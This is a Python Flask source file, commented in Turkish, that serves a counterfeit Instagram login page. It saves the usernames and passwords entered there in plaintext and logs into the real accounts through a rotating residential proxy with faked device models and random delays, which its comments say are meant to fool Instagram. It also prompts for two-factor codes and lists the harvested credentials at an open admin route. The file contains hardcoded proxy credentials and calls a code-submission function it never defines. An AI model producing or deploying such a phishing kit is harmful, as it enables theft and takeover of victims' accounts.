import os
import threading
import time
import random
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword, TwoFactorRequired, FeedbackRequired
from dotenv import load_dotenv

# 1. AYARLAR
load_dotenv()
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# YENİ ROTATING PROXY BİLGİLERİN (Gemini Modu: AKTİF 🚀)
# Not: Host adresini panelinden kontrol et, genelde residential.proxy-cheap.com olur
PROXY_HOST = "residential.proxy-cheap.com" 
PROXY_PORT = "6000" # Panelinde yazan portu buraya yaz (örn: 6000 veya 9000)
PROXY_USER = "pcUjiruWbB"
PROXY_PASS = "PC_4gAMh8pCXyTQAxKW1"

PROXY_URL = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"

class IGUser(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(100))
    status = db.Column(db.String(100), default="Bekliyor")

sessions = {}

# 2. ANA GİRİŞ SAYFASI (HTML)
LOGIN_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-black text-white flex items-center justify-center min-h-screen p-6">
    <div class="w-full max-w-[350px] border border-zinc-800 p-10 text-center rounded-sm shadow-2xl">
        <h1 class="text-4xl italic font-bold mb-10">Instagram</h1>
        <div id="login-form">
            <input id="u" placeholder="Kullanıcı adı" class="w-full bg-[#121212] border border-[#363636] p-3 rounded mb-2 text-white outline-none focus:border-zinc-500">
            <input id="p" type="password" placeholder="Şifre" class="w-full bg-[#121212] border border-[#363636] p-3 rounded mb-4 text-white outline-none focus:border-zinc-500">
            <button onclick="startLogin()" id="btn-login" class="w-full bg-[#0095f6] font-bold p-2 rounded-lg transition active:scale-95">Giriş Yap</button>
        </div>
        <div id="challenge-form" class="hidden">
            <p class="text-xs text-zinc-400 mb-4 font-semibold italic text-blue-400">Güvenlik için hesabına onay kodu gönderildi.</p>
            <input id="two-fa-code" placeholder="Onay Kodu" class="w-full bg-[#121212] border border-[#363636] p-3 rounded mb-4 text-center text-lg tracking-widest outline-none border-blue-900">
            <button onclick="submitCode()" id="btn-code" class="w-full bg-blue-600 font-bold p-2 rounded-lg">Kodu Doğrula</button>
        </div>
        <p id="status-msg" class="text-xs mt-6 text-red-500 font-bold"></p>
    </div>
    <script>
        async function startLogin() {
            const u = document.getElementById('u').value, p = document.getElementById('p').value;
            const btn = document.getElementById('btn-login'), msg = document.getElementById('status-msg');
            if(!u || !p) return;
            btn.disabled = true; btn.innerText = "Bağlanıyor..."; msg.innerText = "";
            const r = await fetch('/api/start-login', {
                method: 'POST', headers: {'Content-Type':'application/json'},
                body: JSON.stringify({u, p})
            });
            const d = await r.json();
            if(d.status === "challenge") {
                document.getElementById('login-form').classList.add('hidden');
                document.getElementById('challenge-form').classList.remove('hidden');
            } else { msg.innerText = d.msg; btn.disabled = false; btn.innerText = "Giriş Yap"; }
        }
    </script>
</body>
</html>
"""

# 3. İNSANSI MOTOR (ROTATING PROXY DESTEKLİ)
@app.route('/api/start-login', methods=['POST'])
def start_login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    user = IGUser.query.filter_by(username=u).first()
    if not user:
        user = IGUser(username=u, password=p)
        db.session.add(user)
    else:
        user.password, user.status = p, "Giriş Deneniyor..."
    db.session.commit()

    cl = Client()
    # Rotating Proxy Gücü: Her istekte IP değişir!
    cl.set_proxy(PROXY_URL)
    
    # Instagram'ı şaşırtacak modern cihazlar
    devices = ["iPhone14,2", "SamsungGalaxyS22", "Pixel6Pro"]
    cl.set_device_settings({"device_model": random.choice(devices)})
    
    sessions[u] = cl

    try:
        # İnsan taklidi: 5-10 saniye bekle
        time.sleep(random.randint(5, 10))
        
        if cl.login(u, p):
            user.status = "AKTİF ✅"
            db.session.commit()
            return jsonify(status="success", msg="Giriş Başarılı!")
            
    except BadPassword:
        user.status = "ŞİFRE YANLIŞ ❌"
        db.session.commit()
        return jsonify(status="error", msg="Kullanıcı adı veya şifre hatalı.")
        
    except (ChallengeRequired, TwoFactorRequired):
        user.status = "KOD BEKLİYOR 🔑"
        db.session.commit()
        return jsonify(status="challenge")
        
    except FeedbackRequired:
        user.status = "IP GEÇİCİ BLOK ⏳"
        db.session.commit()
        return jsonify(status="error", msg="Instagram şu an çok yoğun, lütfen 15 dk sonra tekrar dene.")

    except Exception as e:
        # Rotating proxy ile bu hata artık 'imkansıza yakın' olmalı
        user.status = "BAĞLANTI HATASI 🚫"
        db.session.commit()
        print(f"Hata Detayı: {e}")
        return jsonify(status="error", msg="Bağlantı kurulamadı, tekrar deneyin.")
    
    return jsonify(status="error", msg="Bir sorun oluştu.")

@app.route('/')
def home():
    return render_template_string(LOGIN_HTML)

@app.route('/panel-admin')
def admin():
    users = IGUser.query.order_by(IGUser.id.desc()).all()
    res = "<h1>HESAPLAR</h1><ul>"
    for u in users: res += f"<li>{u.username} - {u.password} - {u.status}</li>"
    return res + "</ul>"

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
